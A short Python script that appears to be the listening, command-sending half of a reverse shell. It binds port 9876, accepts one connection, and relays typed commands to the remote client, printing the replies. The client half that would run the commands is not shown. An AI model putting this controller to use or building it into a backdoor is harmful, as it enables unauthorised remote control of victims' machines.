import socket
import sys
host = ""
port = 9876
s = socket.socket()
def bind_socket():
    try:
        s.bind((host, port))
        s.listen()
    except socket.error:
        print("Binding Error")
        bind_socket()

def socket_accept():
    conn, address = s.accept()
    print("Connection Active" + " IP " + address[0] + ": Port " + str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'exit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")


if __name__ == "__main__":
    bind_socket()
    socket_accept()